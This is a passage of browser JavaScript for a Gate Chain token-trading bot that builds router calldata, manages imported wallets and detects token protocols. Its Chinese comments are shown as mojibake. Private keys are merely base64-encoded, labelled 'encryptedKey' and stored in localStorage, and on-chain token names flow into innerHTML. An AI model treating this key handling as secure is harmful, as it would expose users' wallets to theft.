            console.log('ÊØè‰∏™ÂèÇÊï∞ÈïøÂ∫¶:', params.map(p => p.length));
            console.log('methodId:', methodId);
            console.log('deadline:', deadline);
            console.log('deadlineHex:', deadlineHex);
            console.log('cleanToken:', cleanToken);
            console.log('cleanTo:', cleanTo);
            console.log('Ê≠£Á°ÆÁöÑpath[0]:', correctPath0);
            return calldata;
        }

        // DYORÂÜÖÁõòÂçñÂá∫‰∫§ÊòìÊï∞ÊçÆÊûÑÂª∫ÂáΩÊï∞ - ÂÆåÂÖ®ÊåâÁÖßÊÇ®ÁöÑXLayer‰ª£Á†ÅÁªìÊûÑ
        function buildDYORInternalSellCalldata(tokenAddress, amountIn, amountOutMin, toAddress) {
            try {
                console.log('=== buildDYORInternalSellCalldata ÂºÄÂßã ===');
                console.log('ËæìÂÖ•ÂèÇÊï∞:');
                console.log('- tokenAddress:', tokenAddress);
                console.log('- amountIn:', amountIn.toString());
                console.log('- amountOutMin:', amountOutMin.toString());
                console.log('- toAddress:', toAddress);
                
                const methodId = '0xaf8a4293';
                const deadline = Math.floor(Date.now() / 1000) + 1800; // ÂØπÂ∫îCONFIG.DEADLINE_BUFFER
                
                const cleanToken = tokenAddress.replace('0x', '').toLowerCase();
                const cleanTo = toAddress.replace('0x', '').toLowerCase();
                
                // ‰ΩøÁî®Ê≠£Á°ÆÁöÑGate ChainË∑ØÂæÑÂú∞ÂùÄ - ÂØπÂ∫îXLayerÁöÑWOKB_ADDRESS
                const correctPath0 = '672f30407a71fa8737a3a14474ff37e09c7fc44a'; // Gate ChainÁöÑÊ≠£Á°ÆÂú∞ÂùÄ
                
                // ÂÆåÂÖ®ÊåâÁÖßÊÇ®ÁöÑXLayer‰ª£Á†ÅÔºö‰ΩøÁî®toHexString()ÊñπÊ≥ï
                const amountInHex = amountIn.toString(16).padStart(64, '0');
                const amountOutMinHex = amountOutMin.toString(16).padStart(64, '0');
                
                console.log('Â§ÑÁêÜÂêéÁöÑÂèÇÊï∞:');
                console.log('- methodId:', methodId);
                console.log('- deadline:', deadline);
                console.log('- cleanToken:', cleanToken);
                console.log('- cleanTo:', cleanTo);
                console.log('- correctPath0:', correctPath0);
                console.log('- amountInHex:', amountInHex);
                console.log('- amountOutMinHex:', amountOutMinHex);
                
                const params = [
                    amountInHex,
                    amountOutMinHex,
                    '00000000000000000000000000000000000000000000000000000000000000e0',
                    '000000000000000000000000' + cleanTo,
                    '0000000000000000000000000000000000000000000000000000000000000000',
                    '0000000000000000000000000000000000000000000000000000000000000000',
                    deadline.toString(16).padStart(64, '0'),
                    '0000000000000000000000000000000000000000000000000000000000000002',
                    '000000000000000000000000' + cleanToken,
                    '000000000000000000000000' + correctPath0 // ÂØπÂ∫îXLayerÁöÑcleanWOKB
                ];
                
                console.log('paramsÊï∞ÁªÑ:');
                params.forEach((param, index) => {
                    console.log(`- params[${index}]:`, param, '(ÈïøÂ∫¶:', param.length, ')');
                });
                
                const calldata = methodId + params.join('');
                console.log('ÊúÄÁªàcalldata:', calldata);
                console.log('calldataÈïøÂ∫¶:', calldata.length);
                console.log('=== buildDYORInternalSellCalldata ÁªìÊùü ===');
                
                return calldata;
            } catch (error) {
                console.error('buildDYORInternalSellCalldata ÈîôËØØ:', error);
                throw error;
            }
        }

        // DEXÂêàÁ∫¶Âú∞ÂùÄÈÖçÁΩÆ
        const DEX_ADDRESSES = {
            GTSWAP: {
                router: '0xc5dbd69446476e844c4f9fce57a077592cf5b807', // GTSWAP V2 RouterÂú∞ÂùÄ
                factory: '0xe9c3b16504e9e8bdfd94126cc66244dfef4536ed' // GTSWAP V2 FactoryÂú∞ÂùÄ
            },
            DYORSWAP: {
                router: '0xc5b8d4975a7976f6dce98b7cb6ec91b5d59e8c1e', // DYOR V2 RouterÂú∞ÂùÄ
                factory: '0x8eb3a00f08004b7a1071d336ee9c6534dd3862b2' // DYOR V2 FactoryÂú∞ÂùÄ
            },
            DYOR_INTERNAL: {
                router: '0x97aa99c0afdd156ba3558b10687e378566132af5' // DYORÂÜÖÁõòRouterÂú∞ÂùÄ - Gate ChainÊ≠£Á°ÆÂú∞ÂùÄ
            }
        };

        // UniswapV2 Router ABI (ÈÄÇÁî®‰∫éGTSWAP V2ÂíåDYOR V2)
        const UNISWAP_V2_ROUTER_ABI = [
            'function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts)',
            'function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)',
            'function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)',
            'function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)',
            'function WETH() external pure returns (address)'
        ];

        // GasËÆæÁΩÆÈÖçÁΩÆ
        const GAS_CONFIG = {
            DEFAULT_LIMIT: 850000,  // ÈªòËÆ§gas limit 85‰∏áÔºàÁ°Æ‰øù‰∫§ÊòìÊàêÂäüÔºâ
            DEFAULT_PRICE: 5000,    // ÈªòËÆ§gas‰ª∑Ê†º 5000 Gwei
            SPEEDS: {
                QUICKLY: { multiplier: 1.0, name: 'Quickly' },  // ‰ΩøÁî®ÈªòËÆ§‰ª∑Ê†º
                FAST: { multiplier: 1.0, name: 'Fast' },        // ‰ΩøÁî®ÈªòËÆ§‰ª∑Ê†º
                TURBO: { multiplier: 1.0, name: 'Turbo' }       // ‰ΩøÁî®ÈªòËÆ§‰ª∑Ê†º
            }
        };

        // ERC20 ABI for approve and allowance
        const ERC20_EXTENDED_ABI = [
            'function balanceOf(address owner) external view returns (uint256)',
            'function decimals() external view returns (uint8)',
            'function symbol() external view returns (string)',
            'function name() external view returns (string)',
            'function approve(address spender, uint256 amount) public returns(bool)',
            'function allowance(address owner, address spender) public view returns(uint256)'
        ];

        // ÂçñÂá∫ÂêàÁ∫¶ABI
        const SELL_ABI = [
            'function sellTokens(uint256 amount) public'
        ];
        
        // ÊûÑÂª∫‰π∞ÂÖ•Êï∞ÊçÆ - Áõ¥Êé•‰ΩøÁî®ÂáΩÊï∞ÈÄâÊã©Âô®
        function buildBuyData() {
            // ‰π∞ÂÖ•Â∞±ÊòØÁõ¥Êé•‰ΩøÁî® 0xd0febe4cÔºå‰∏çÈúÄË¶ÅÈ¢ùÂ§ñÂèÇÊï∞
            return GTLAUNCH_DATA.BUY_HEX;
        }

        // ABI
        const ERC20_ABI = [
            'function balanceOf(address owner) external view returns (uint256)',
            'function decimals() external view returns (uint8)',
            'function symbol() external view returns (string)',
            'function name() external view returns (string)'
        ];

        // Áä∂ÊÄÅÁÆ°ÁêÜ
        let wallets = [];
        let selectedDex = null;
        let selectedPlatform = 'external';
        let isTrading = false;
        let tokenCache = {};
        let walletTokens = {};
        let stats = {
            totalTrades: 0,
            totalTokenTypes: 0
        };
        let fetchTokenTimeout = null;
        let currentGasSpeed = 'FAST'; // ÈªòËÆ§ÈÄâÊã©Fast
        let currentTokenInfo = null; // ÂΩìÂâçÈÄâÊã©ÁöÑ‰ª£Â∏Å‰ø°ÊÅØ
        let tokenPrices = {}; // ‰ª£Â∏Å‰ª∑Ê†ºÁºìÂ≠ò

        // ÂàùÂßãÂåñ
        async function init() {
            loadWallets();
            updateStats();
            initMouseGlow();
            initGasSettings();
            showToast('üöÄ Á≥ªÁªüÂêØÂä®ÊàêÂäü', 'success');
        }

        // ÂàùÂßãÂåñGasËÆæÁΩÆ
        function initGasSettings() {
            // ËÆæÁΩÆÈªòËÆ§gasÈÄüÂ∫¶
            setGasSpeed('FAST');
            
            // ËÆæÁΩÆÈªòËÆ§gas limit
            document.getElementById('gasLimit').value = GAS_CONFIG.DEFAULT_LIMIT;
            
            // ËÆæÁΩÆÈªòËÆ§gas‰ª∑Ê†º
            const speedConfig = GAS_CONFIG.SPEEDS[currentGasSpeed];
            const defaultGasPrice = GAS_CONFIG.DEFAULT_PRICE * speedConfig.multiplier;
            document.getElementById('gasPrice').value = Math.round(defaultGasPrice);
            
            // Áõ¥Êé•‰ΩøÁî®ÈªòËÆ§‰ª∑Ê†ºÔºå‰∏çËé∑ÂèñRPC
            console.log(`‰ΩøÁî®ÈªòËÆ§Gas‰ª∑Ê†º: ${defaultGasPrice} Gwei`);
        }

        // ÊµãËØïRPCËøûÊé•
        async function testRpcConnection() {
            try {
                console.log('ÂºÄÂßãÊµãËØïRPCËøûÊé•...');
                console.log('‰∏ªRPC:', CONFIG.rpcUrl);
                console.log('Â§áÁî®RPC:', CONFIG.backupRpcUrl);
                
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                
                // ÊµãËØïÂü∫Êú¨ËøûÊé•
                console.log('ÊµãËØïÁΩëÁªúËøûÊé•...');
                const network = await provider.getNetwork();
                console.log('RPCËøûÊé•ÊàêÂäüÔºåÁΩëÁªú‰ø°ÊÅØ:', network);
                
                // ÊµãËØïËé∑ÂèñÊúÄÊñ∞Âå∫Âùó
                console.log('ÊµãËØïËé∑ÂèñÂå∫ÂùóÂè∑...');
                const blockNumber = await provider.getBlockNumber();
                console.log('ÊúÄÊñ∞Âå∫ÂùóÂè∑:', blockNumber);
                
                // ÊµãËØïËé∑ÂèñGas‰ª∑Ê†º
                console.log('ÊµãËØïËé∑ÂèñGas‰ª∑Ê†º...');
                let gasPrice;
                try {
                    // ÊñπÊ≥ï1: Â∞ùËØïÁõ¥Êé•RPCË∞ÉÁî®
                    console.log('Â∞ùËØïÊñπÊ≥ï1: provider.send("eth_gasPrice")');
                    gasPrice = await provider.send('eth_gasPrice', []);
                    console.log('ÊñπÊ≥ï1ÊàêÂäü:', gasPrice);
                } catch (gasError1) {
                    console.log('ÊñπÊ≥ï1Â§±Ë¥•:', gasError1.message);
                    try {
                        // ÊñπÊ≥ï2: Â∞ùËØïgetGasPriceÊñπÊ≥ï
                        console.log('Â∞ùËØïÊñπÊ≥ï2: provider.getGasPrice()');
                        if (typeof provider.getGasPrice === 'function') {
                            gasPrice = await provider.getGasPrice();
                            console.log('ÊñπÊ≥ï2ÊàêÂäü:', gasPrice);
                        } else {
                            throw new Error('getGasPriceÊñπÊ≥ï‰∏çÂ≠òÂú®');
                        }
                    } catch (gasError2) {
                        console.log('ÊñπÊ≥ï2Â§±Ë¥•:', gasError2.message);
                        try {
                            // ÊñπÊ≥ï3: Â∞ùËØïfetchÁõ¥Êé•Ë∞ÉÁî®
                            console.log('Â∞ùËØïÊñπÊ≥ï3: fetchÁõ¥Êé•Ë∞ÉÁî®');
                            const response = await fetch(CONFIG.rpcUrl, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                },
                                body: JSON.stringify({
                                    jsonrpc: '2.0',
                                    method: 'eth_gasPrice',
                                    params: [],
                                    id: 1
                                })
                            });
                            const data = await response.json();
                            if (data.result) {
                                gasPrice = data.result;
                                console.log('ÊñπÊ≥ï3ÊàêÂäü:', gasPrice);
                            } else {
                                throw new Error('RPCËøîÂõûÈîôËØØ: ' + (data.error?.message || 'Êú™Áü•ÈîôËØØ'));
                            }
                        } catch (gasError3) {
                            console.log('ÊñπÊ≥ï3Â§±Ë¥•:', gasError3.message);
                            throw new Error('ÊâÄÊúâÊñπÊ≥ïÈÉΩÂ§±Ë¥•');
                        }
                    }
                }
                console.log('Gas‰ª∑Ê†º (wei):', gasPrice.toString());
                console.log('Gas‰ª∑Ê†º (Gwei):', ethers.formatUnits(gasPrice, 'gwei'));
                
                // Ëé∑ÂèñGas‰ª∑Ê†º
                await getDynamicGasPrice();
                
            } catch (error) {
                console.error('RPCËøûÊé•ÊµãËØïÂ§±Ë¥•:', error);
                console.error('ÈîôËØØËØ¶ÊÉÖ:', {
                    message: error.message,
                    code: error.code,
                    reason: error.reason,
                    stack: error.stack
                });
                showToast('‚ö†Ô∏è RPCËøûÊé•Â§±Ë¥•Ôºå‰ΩøÁî®ÈªòËÆ§Gas‰ª∑Ê†º', 'error');
            }
        }

        // ÂàùÂßãÂåñÈº†Ê†áË∑üÈöèÂÖâÊïà
        function initMouseGlow() {
            const glow = document.createElement('div');
            glow.className = 'mouse-glow';
            document.body.appendChild(glow);

            document.addEventListener('mousemove', function(e) {
                glow.style.left = e.clientX - 150 + 'px';
                glow.style.top = e.clientY - 150 + 'px';
                glow.style.opacity = '1';
            });

            document.addEventListener('mouseleave', function() {
                glow.style.opacity = '0';
            });
        }

        // ToastÈÄöÁü•
        function showToast(message, type = 'info') {
            const existingToast = document.querySelector('.toast');
            if (existingToast) {
                existingToast.remove();
            }
            
            const toast = document.createElement('div');
            toast.className = 'toast ' + type;
            
            const iconMap = {
                success: '‚úÖ',
                error: '‚ùå',
                info: '‚ÑπÔ∏è'
            };
            
            toast.innerHTML = '<div style="display: flex; align-items: center; gap: 10px;">' +
                '<span style="font-size: 18px;">' + iconMap[type] + '</span>' +
                '<span>' + message + '</span>' +
                '</div>';
            
            document.body.appendChild(toast);
            
            setTimeout(function() {
                toast.style.animation = 'toastSlideIn 0.3s ease reverse';
                setTimeout(function() { 
                    if (toast.parentNode) {
                        toast.parentNode.removeChild(toast);
                    }
                }, 300);
            }, 3000);
        }

        // Èí±ÂåÖÁÆ°ÁêÜ
        function loadWallets() {
            const stored = localStorage.getItem('gtbot_wallets');
            if (stored) {
                try {
                    wallets = JSON.parse(stored);
                    renderWallets();
                    scanAllWalletTokens();
                } catch (e) {
                    console.error('Failed to load wallets:', e);
                }
            }
        }

        function saveWallets() {
            localStorage.setItem('gtbot_wallets', JSON.stringify(wallets));
        }

        async function renderWallets() {
            const container = document.getElementById('walletList');
            container.innerHTML = '';
            
            let activeCount = 0;
            
            for (let i = 0; i < wallets.length; i++) {
                const wallet = wallets[i];
                if (wallet.active) activeCount++;
                
                const gtBalance = await getBalance(wallet.address);
                const tokens = walletTokens[wallet.address] || [];
                
                const walletDiv = document.createElement('div');
                walletDiv.className = 'wallet-item' + (wallet.active ? ' active' : '');
                
                let tokensHtml = '';
                if (tokens.length > 0) {
                    tokensHtml = '<div class="token-list">' +
                        '<div class="token-list-title">ÊåÅÊúâ‰ª£Â∏Å (' + tokens.length + ')</div>';
                    
                    for (let j = 0; j < tokens.length; j++) {
                        const token = tokens[j];
                        tokensHtml += '<div class="token-item" onclick="showTokenDetails(\'' + 
                            token.address + '\', \'' + token.symbol + '\', \'' + token.name + 
                            '\', \'' + token.balance + '\', \'' + token.decimals + '\', \'' + 
                            wallet.address + '\')">' +
                            '<div class="token-logo">' + token.symbol.substring(0, 2) + '</div>' +
                            '<div class="token-info">' +
                                '<div class="token-symbol">' + token.symbol + '</div>' +
                                '<div class="token-name">' + token.name + '</div>' +
                            '</div>' +
                            '<div class="token-balance">' + formatTokenBalance(token.balance, token.decimals) + '</div>' +
                            '<button class="copy-btn" onclick="copyAddress(event, \'' + token.address + '\')">Â§çÂà∂</button>' +
                        '</div>';
                    }
                    tokensHtml += '</div>';
                }
                
                walletDiv.innerHTML = 
                    '<div class="wallet-header">' +
                        '<div class="wallet-address">' + wallet.address.substring(0, 6) + '...' + wallet.address.substring(38) + '</div>' +
                        '<div class="toggle-switch' + (wallet.active ? ' active' : '') + '" onclick="toggleWallet(\'' + wallet.address + '\')"></div>' +
                    '</div>' +
                    '<div class="wallet-balances">' +
                        '<div class="balance-item">' +
                            '<span class="balance-label">GT:</span>' +
                            '<span class="balance-value">' + parseFloat(gtBalance).toFixed(4) + '</span>' +
                        '</div>' +
                    '</div>' +
                    tokensHtml;
                
                container.appendChild(walletDiv);
            }
            
            document.getElementById('activeWallets').textContent = activeCount;
            updateActiveWalletsStatus();
        }

        async function getBalance(address) {
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                const balance = await provider.getBalance(address);
                return ethers.formatEther(balance);
            } catch (e) {
                return '0';
            }
        }

        // Êâ´ÊèèÈí±ÂåÖ‰ª£Â∏Å
        async function scanAllWalletTokens() {
            for (let i = 0; i < wallets.length; i++) {
                await scanWalletTokens(wallets[i].address);
            }
            updateTokenTypeCount();
        }

        async function scanWalletTokens(walletAddress) {
            try {
                const tokens = [];
                
                // ‰ªéÁºìÂ≠ò‰∏≠Ê∑ªÂä†Â∑≤Áü•‰ª£Â∏Å
                for (const address in tokenCache) {
                    const tokenInfo = tokenCache[address];
                    try {
                        const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                            chainId: CONFIG.chainId,
                            name: 'Gate Chain'
                        });
                        const tokenContract = new ethers.Contract(address, ERC20_ABI, provider);
                        const balance = await tokenContract.balanceOf(walletAddress);
                        
                        if (balance > 0) {
                            tokens.push({
                                address: address,
                                symbol: tokenInfo.symbol,
                                name: tokenInfo.name,
                                decimals: tokenInfo.decimals,
                                balance: balance.toString()
                            });
                        }
                    } catch (e) {
                        // ÂøΩÁï•ÈîôËØØ
                    }
                }
                
                walletTokens[walletAddress] = tokens;
            } catch (e) {
                console.error('Failed to scan wallet tokens:', e);
                walletTokens[walletAddress] = [];
            }
        }

        function updateTokenTypeCount() {
            const allTokens = new Set();
            for (const address in walletTokens) {
                const tokens = walletTokens[address];
                for (let i = 0; i < tokens.length; i++) {
                    allTokens.add(tokens[i].address);
                }
            }
            stats.totalTokenTypes = allTokens.size;
            document.getElementById('tokenTypes').textContent = stats.totalTokenTypes;
        }

        function formatTokenBalance(balance, decimals) {
            const formatted = ethers.formatUnits(balance, decimals);
            const num = parseFloat(formatted);
            if (num === 0) return '0';
            if (num < 0.0001) return '<0.0001';
            if (num < 1) return num.toFixed(4);
            if (num < 1000) return num.toFixed(2);
            if (num < 1000000) return (num / 1000).toFixed(2) + 'K';
            return (num / 1000000).toFixed(2) + 'M';
        }

        // Â§çÂà∂Âú∞ÂùÄ
        function copyAddress(event, address) {
            event.stopPropagation();
            navigator.clipboard.writeText(address);
            showToast('üìã Âú∞ÂùÄÂ∑≤Â§çÂà∂', 'success');
        }

        // ÊòæÁ§∫‰ª£Â∏ÅËØ¶ÊÉÖ
        function showTokenDetails(address, symbol, name, balance, decimals, walletAddress) {
            event.stopPropagation();
            
            document.getElementById('tokenDetailsLogo').textContent = symbol.substring(0, 2);
            document.getElementById('tokenDetailsName').textContent = name;
            document.getElementById('tokenDetailsSymbol').textContent = symbol;
            document.getElementById('tokenDetailsAddress').textContent = address;
            document.getElementById('tokenDetailsBalance').textContent = formatTokenBalance(balance, decimals);
            document.getElementById('tokenDetailsWallet').textContent = 
                walletAddress.substring(0, 6) + '...' + walletAddress.substring(38);
            
            window.currentTokenDetails = {
                address: address,
                symbol: symbol,
                name: name,
                balance: balance,
                decimals: decimals,
                walletAddress: walletAddress
            };
            
            document.getElementById('tokenDetailsModal').style.display = 'flex';
        }

        // ÂÖ≥Èó≠‰ª£Â∏ÅËØ¶ÊÉÖÊ®°ÊÄÅÊ°Ü
        function closeTokenDetailsModal() {
            document.getElementById('tokenDetailsModal').style.display = 'none';
            window.currentTokenDetails = null;
        }

        // Â§çÂà∂‰ª£Â∏ÅÂêàÁ∫¶Âú∞ÂùÄ
        function copyTokenAddress() {
            if (window.currentTokenDetails) {
                navigator.clipboard.writeText(window.currentTokenDetails.address);
                showToast('üìã ÂêàÁ∫¶Âú∞ÂùÄÂ∑≤Â§çÂà∂', 'success');
            }
        }

        // Â§çÂà∂Èí±ÂåÖÂú∞ÂùÄ
        function copyWalletAddress() {
            if (window.currentTokenDetails) {
                navigator.clipboard.writeText(window.currentTokenDetails.walletAddress);
                showToast('üìã Èí±ÂåÖÂú∞ÂùÄÂ∑≤Â§çÂà∂', 'success');
            }
        }

        // ‰ªéËØ¶ÊÉÖ‰∏≠ÈÄâÊã©‰ª£Â∏Å
        function selectTokenFromDetails() {
            if (window.currentTokenDetails) {
                const tokenDetails = window.currentTokenDetails;
                
                document.getElementById('tokenAddress').value = tokenDetails.address;
                
                tokenCache[tokenDetails.address] = {
                    address: tokenDetails.address,
                    symbol: tokenDetails.symbol,
                    name: tokenDetails.name,
                    decimals: tokenDetails.decimals
                };
                
                displayTokenInfo(tokenCache[tokenDetails.address]);
                
                closeTokenDetailsModal();
                
                showToast('Â∑≤ÈÄâÊã© ' + tokenDetails.symbol, 'success');
            }
        }

        // ÊòæÁ§∫Ê∑ªÂä†Èí±ÂåÖÊ®°ÊÄÅÊ°Ü
        function showAddWalletModal() {
            document.getElementById('addWalletModal').style.display = 'flex';
        }

        function closeAddWalletModal() {
            document.getElementById('addWalletModal').style.display = 'none';
            document.getElementById('privateKeyInput').value = '';
        }

        // ÂØºÂÖ•Èí±ÂåÖ
        async function importWallet() {
            let privateKey = document.getElementById('privateKeyInput').value.trim();
            
            // Â§ÑÁêÜÁßÅÈí•Ê†ºÂºè
            if (!privateKey) {
                showToast('ËØ∑ËæìÂÖ•ÁßÅÈí•', 'error');
                return;
            }
            
            // Â¶ÇÊûúÁßÅÈí•Ê≤°Êúâ0xÂâçÁºÄÔºåËá™Âä®Ê∑ªÂä†
            if (!privateKey.startsWith('0x')) {
                privateKey = '0x' + privateKey;
            }
            
            // È™åËØÅÁßÅÈí•ÈïøÂ∫¶Ôºà64‰ΩçÂçÅÂÖ≠ËøõÂà∂ + 0xÂâçÁºÄ = 66‰ΩçÔºâ
            if (privateKey.length !== 66) {
                showToast('ÁßÅÈí•Ê†ºÂºèÈîôËØØÔºåÂ∫î‰∏∫64‰ΩçÂçÅÂÖ≠ËøõÂà∂Â≠óÁ¨¶‰∏≤', 'error');
                return;
            }
            
            // ÊòæÁ§∫Âä†ËΩΩÁä∂ÊÄÅ
            const importBtn = document.querySelector('.modal-confirm');
            const originalText = importBtn.textContent;
            importBtn.innerHTML = '<span class="loading-spinner"></span> ÂØºÂÖ•‰∏≠...';
            importBtn.disabled = true;
            
            try {
                const wallet = new ethers.Wallet(privateKey);
                const address = wallet.address;
                
                // Ê£ÄÊü•ÊòØÂê¶Â∑≤Â≠òÂú®
                for (let i = 0; i < wallets.length; i++) {
                    if (wallets[i].address === address) {
                        showToast('ËØ•Èí±ÂåÖÂ∑≤Â≠òÂú®', 'error');
                        return;
                    }
                }
                
                const encryptedKey = btoa(privateKey);
                
                wallets.push({
                    address: address,
                    encryptedKey: encryptedKey,
                    active: false
                });
                
                saveWallets();
                await scanWalletTokens(address);
                renderWallets();
                closeAddWalletModal();
                showToast('‚úÖ Èí±ÂåÖÂØºÂÖ•ÊàêÂäü', 'success');
            } catch (e) {
                showToast('ÁßÅÈí•Êó†Êïà', 'error');
                console.error(e);
            } finally {
                // ÊÅ¢Â§çÊåâÈíÆÁä∂ÊÄÅ
                importBtn.textContent = originalText;
                importBtn.disabled = false;
            }
        }

        // ÂàáÊç¢Èí±ÂåÖÁä∂ÊÄÅ
        function toggleWallet(address) {
            event.stopPropagation();
            for (let i = 0; i < wallets.length; i++) {
                if (wallets[i].address === address) {
                    wallets[i].active = !wallets[i].active;
                    saveWallets();
                    renderWallets();
                    break;
                }
            }
        }

        // Êõ¥Êñ∞Ê¥ªË∑ÉÈí±ÂåÖÁä∂ÊÄÅÊ†è
        function updateActiveWalletsStatus() {
            const activeWallets = wallets.filter(function(w) { return w.active; });
            const statusElement = document.getElementById('activeWalletsStatus');
            const countElement = document.getElementById('activeWalletsCount');
            const listElement = document.getElementById('statusWalletsList');
            
            if (activeWallets.length > 0) {
                statusElement.style.display = 'block';
                countElement.textContent = activeWallets.length;
                
                let walletsHtml = '';
                for (let i = 0; i < activeWallets.length; i++) {
                    const wallet = activeWallets[i];
                    walletsHtml += '<div class="status-wallet-item">' +
                        wallet.address.substring(0, 6) + '...' + wallet.address.substring(38) +
                        '</div>';
                }
                listElement.innerHTML = walletsHtml;
            } else {
                statusElement.style.display = 'none';
            }
        }

        // ‰ª£Â∏ÅÂçèËÆÆËØÜÂà´ÂáΩÊï∞
        async function detectTokenProtocol(tokenAddress) {
            try {
                const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl, {
                    chainId: CONFIG.chainId,
                    name: 'Gate Chain'
                });
                
                // ÊñπÊ≥ï1: Ê£ÄÊü•ÂêàÁ∫¶ÊòØÂê¶ÊúâsellTokensÂáΩÊï∞ÔºàGTLAUNCHÁâπÂæÅÔºâ
                try {
                    const sellContract = new ethers.Contract(tokenAddress, ['function sellTokens(uint256 amount) public'], provider);
                    // Â∞ùËØïË∞ÉÁî®sellTokensÂáΩÊï∞Ôºà‰∏çÂèëÈÄÅ‰∫§ÊòìÔºåÂè™ÊòØÊ£ÄÊü•ÂáΩÊï∞ÊòØÂê¶Â≠òÂú®Ôºâ
                    await sellContract.sellTokens.staticCall(0);
                    console.log('Ê£ÄÊµãÂà∞GTLAUNCHÂçèËÆÆ‰ª£Â∏Å');
                    return 'GTLAUNCH';
                } catch (error) {
                    // sellTokensÂáΩÊï∞‰∏çÂ≠òÂú®ÔºåÁªßÁª≠Ê£ÄÊü•ÂÖ∂‰ªñÁâπÂæÅ
                }
                
                // ÊñπÊ≥ï2: Ê£ÄÊü•ÂêàÁ∫¶ÊòØÂê¶ÊúâÁâπÂÆöÁöÑÂáΩÊï∞ÈÄâÊã©Âô®
                try {
                    // Ê£ÄÊü•ÊòØÂê¶Êúâ‰π∞ÂÖ•ÂáΩÊï∞ÈÄâÊã©Âô® 0xd0febe4c
                    const buyContract = new ethers.Contract(tokenAddress, ['function buy() public payable'], provider);
                    await buyContract.buy.staticCall({ value: 0 });
                    console.log('Ê£ÄÊµãÂà∞GTLAUNCHÂçèËÆÆ‰ª£Â∏ÅÔºàÈÄöËøá‰π∞ÂÖ•ÂáΩÊï∞Ôºâ');
                    return 'GTLAUNCH';
                } catch (error) {
                    // ‰π∞ÂÖ•ÂáΩÊï∞‰∏çÂ≠òÂú®
                }
                
                // ÊñπÊ≥ï3: Ê£ÄÊü•ÂêàÁ∫¶‰ª£Á†Å‰∏≠ÊòØÂê¶ÂåÖÂê´ÁâπÂÆöÂ≠óËäÇÁ†Å
                try {
                    const code = await provider.getCode(tokenAddress);
                    // GTLAUNCHÂêàÁ∫¶ÈÄöÂ∏∏ÂåÖÂê´ÁâπÂÆöÁöÑÂ≠óËäÇÁ†ÅÊ®°Âºè
                    if (code.includes('d0febe4c') || code.includes('6c11bcd3')) {
                        console.log('Ê£ÄÊµãÂà∞GTLAUNCHÂçèËÆÆ‰ª£Â∏ÅÔºàÈÄöËøáÂ≠óËäÇÁ†ÅÔºâ');
                        return 'GTLAUNCH';
                    }
                } catch (error) {
                    console.warn('Êó†Ê≥ïËé∑ÂèñÂêàÁ∫¶‰ª£Á†Å:', error.message);
                }
                
                // ÊñπÊ≥ï4: Ê£ÄÊü•ÊòØÂê¶ÊîØÊåÅDYORÂÜÖÁõòÁöÑswapÂáΩÊï∞
                try {
                    // Ê£ÄÊü•ÊòØÂê¶ÊúâswapÁõ∏ÂÖ≥ÁöÑÂáΩÊï∞
                    const swapContract = new ethers.Contract(tokenAddress, [
                        'function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)'
                    ], provider);
                    // ËøôÈáåÂè™ÊòØÊ£ÄÊü•ÂáΩÊï∞ÊòØÂê¶Â≠òÂú®Ôºå‰∏çÂÆûÈôÖË∞ÉÁî®
                    console.log('Ê£ÄÊµãÂà∞DYORÂçèËÆÆ‰ª£Â∏Å');
                    return 'DYOR_INTERNAL';
                } catch (error) {
                    // ‰∏çÊòØDYORÂçèËÆÆ
                }
                
                // ÈªòËÆ§ËøîÂõûÊú™Áü•ÂçèËÆÆ
                console.log('Êó†Ê≥ïËØÜÂà´‰ª£Â∏ÅÂçèËÆÆÔºåÈªòËÆ§‰∏∫DYOR_INTERNAL');
                return 'DYOR_INTERNAL';
                
            } catch (error) {
                console.error('‰ª£Â∏ÅÂçèËÆÆÊ£ÄÊµãÂ§±Ë¥•:', error);
                return 'DYOR_INTERNAL'; // ÈªòËÆ§ËøîÂõûDYOR_INTERNAL
            }
        }

        // Ëá™Âä®ÈÄâÊã©Ê≠£Á°ÆÁöÑÂÜÖÁõòÂçèËÆÆ
        async function autoSelectInternalProtocol(tokenAddress) {
            const detectedProtocol = await detectTokenProtocol(tokenAddress);
            console.log(`Ê£ÄÊµãÂà∞‰ª£Â∏ÅÂçèËÆÆ: ${detectedProtocol}`);
            
            // Á°Æ‰øùÈÄâÊã©ÂÜÖÁõòÂπ≥Âè∞
            if (selectedPlatform !== 'internal') {
                console.log('Ëá™Âä®ÂàáÊç¢Âà∞ÂÜÖÁõòÂπ≥Âè∞');
                selectedPlatform = 'internal';
                // Êõ¥Êñ∞UIÊòæÁ§∫
                const tabs = document.querySelectorAll('.platform-tab');
                for (let i = 0; i < tabs.length; i++) {
                    tabs[i].classList.remove('active');
                }
                // ÊøÄÊ¥ªÂÜÖÁõòÊ†áÁ≠æ
                const internalTab = document.querySelector('.platform-tab[onclick*="internal"]');
                if (internalTab) {
                    internalTab.classList.add('active');
                }
                
                // ÊòæÁ§∫ÂÜÖÁõòÈÄâÈ°π
                document.getElementById('externalDexOptions').style.display = 'none';
                document.getElementById('internalDexOptions').style.display = 'grid';
                document.getElementById('hexDataGroup').style.display = 'block';
            }
            
            // Â¶ÇÊûúÂΩìÂâçÈÄâÊã©ÁöÑÊòØÂÜÖÁõòÔºåËá™Âä®ÂàáÊç¢Âà∞Ê£ÄÊµãÂà∞ÁöÑÂçèËÆÆ
            if (selectedPlatform === 'internal') {
                if (selectedDex !== detectedProtocol) {
                    console.log(`Ëá™Âä®ÂàáÊç¢ÂçèËÆÆ: ${selectedDex} -> ${detectedProtocol}`);
                    selectDex(detectedProtocol, 'internal');
